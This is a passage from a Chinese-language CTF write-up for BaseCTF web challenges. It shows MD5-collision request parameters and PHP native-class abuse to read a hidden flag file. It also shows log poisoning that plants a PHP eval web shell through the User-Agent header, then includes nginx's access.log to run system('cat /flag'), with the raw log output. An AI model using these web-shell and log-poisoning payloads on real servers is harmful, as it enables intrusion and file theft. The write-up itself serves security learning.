number">24</span><span class="token operator">&amp;</span>banana<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>appple<span class="token operator">=</span><span class="token number">240610708</span><span class="token operator">&amp;</span>bananana<span class="token operator">=</span>QNKCDZO<span class="token operator">&amp;</span>banananana<span class="token operator">=</span>M<span class="token operator">%</span>C9h<span class="token operator">%</span>FF<span class="token operator">%</span>0E<span class="token operator">%</span>E3<span class="token operator">%</span>5C<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>95r<span class="token operator">%</span>D4w<span class="token operator">%</span>7Br<span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>D3o<span class="token operator">%</span>A7<span class="token operator">%</span>B2<span class="token operator">%</span>1B<span class="token operator">%</span>DCV<span class="token operator">%</span>B7J<span class="token operator">%</span>3D<span class="token operator">%</span>C0x<span class="token operator">%</span>3E<span class="token operator">%</span>7B<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>AF<span class="token operator">%</span>BF<span class="token operator">%</span>A2<span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span>A8<span class="token operator">%</span>28K<span class="token operator">%</span>F3n<span class="token operator">%</span>8EKU<span class="token operator">%</span>B3_Bu<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>D8Igm<span class="token operator">%</span>A0<span class="token operator">%</span>D1<span class="token operator">%</span>D5<span class="token operator">%</span>5D<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>FB_<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>FE<span class="token operator">%</span>A2<span class="token operator">&amp;</span>apppple<span class="token operator">=</span>M<span class="token operator">%</span>C9h<span class="token operator">%</span>FF<span class="token operator">%</span>0E<span class="token operator">%</span>E3<span class="token operator">%</span>5C<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>95r<span class="token operator">%</span>D4w<span class="token operator">%</span>7Br<span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>D3o<span class="token operator">%</span>A7<span class="token operator">%</span>B2<span class="token operator">%</span>1B<span class="token operator">%</span>DCV<span class="token operator">%</span>B7J<span class="token operator">%</span>3D<span class="token operator">%</span>C0x<span class="token operator">%</span>3E<span class="token operator">%</span>7B<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>AF<span class="token operator">%</span>BF<span class="token operator">%</span>A2<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>A8<span class="token operator">%</span>28K<span class="token operator">%</span>F3n<span class="token operator">%</span>8EKU<span class="token operator">%</span>B3_Bu<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>D8Igm<span class="token operator">%</span>A0<span class="token operator">%</span>D1U<span class="token operator">%</span>5D<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>FB_<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>FE<span class="token operator">%</span>A2<span class="token operator">&amp;</span>name<span class="token operator">=</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>00admin<span class="token operator">&amp;</span>md5<span class="token operator">=</span>e7e7b8375abc6096501a68bbd0e3f662<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag直接读取不就行了？"><a href="#flag直接读取不就行了？" class="headerlink" title="flag直接读取不就行了？"></a>flag直接读取不就行了？</h2><p><code>php</code>原生类的利用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$J1ng</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'J'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Hong</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'H'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Keng</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'K'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Wang</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'W'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$Keng</span><span class="token punctuation">(</span><span class="token variable">$Wang</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$J1ng</span><span class="token punctuation">(</span><span class="token variable">$Hong</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问<code>http://challenge.basectf.fun:27459/?K=DirectoryIterator&amp;W=/</code>，发现根目录下有<code>secret</code>，访问<code>http://challenge.basectf.fun:27459/?K=DirectoryIterator&amp;W=/secret</code>发现<code>f11444g.php</code>，发送<code>post</code>请求</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">J</span><span class="token operator">=</span>SplFileObject<span class="token operator">&amp;</span><span class="token constant">H</span><span class="token operator">=</span><span class="token operator">/</span>secret<span class="token operator">/</span>f11444g<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>网页看不到，直接查看源代码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>..<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>f11444g.php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token prolog">&lt;?php BaseCTF&#123;640a9b0d-3b98-4d44-8164-a1113b9ec49f&#125; ?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停"></a>滤个不停</h2><p>文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$incompetent</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'incompetent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Datch</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Datch'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$incompetent</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'HelloWorld'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'写出程序员的第一行问候吧！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//这是个什么东东？？？</span><span class="token variable">$required_chars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'e'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'v'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'n'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'x'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'o'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$is_valid</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$required_chars</span> <span class="token keyword">as</span> <span class="token variable">$char</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$Datch</span><span class="token punctuation">,</span> <span class="token variable">$char</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$is_valid</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$is_valid</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$invalid_patterns</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'php://'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'https://'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ftp://'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'file://'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'data://'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gopher://'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$invalid_patterns</span> <span class="token keyword">as</span> <span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$Datch</span><span class="token punctuation">,</span> <span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'此路不通换条路试试?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$Datch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'文件名不合规 请重试'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：<code>incompetent=HelloWorld&amp;Datch=/var/log/nginx/access.log，user agent中添加&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></p><p>访问<code>/var/log/nginx/access.log</code>发送<code>incompetent=HelloWorld&amp;Datch=/var/log/nginx/access.log&amp;pass=system(&#39;cat /flag&#39;);</code></p><p>得到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">54</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET / HTTP/1.1"</span> <span class="token number">502</span> <span class="token number">559</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">55</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">58</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">58</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token number">02</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /%3C?php%20phpinfo();?%3E HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token number">02</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/%3C?php%20phpinfo();?%3E"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token number">36</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token number">37</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">12</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"POST / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">7391</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">26</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"POST / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5467</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">27</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">30</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"POST / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">8321</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">31</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">08</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K)"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">32</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"POST / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">8935</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"BaseCTF&#123;a0fd8763-8a3b-4bc5-b430-f09a213482e3&#125; "</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">33</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token number">27</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"POST / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">9332</span> <span class="token string 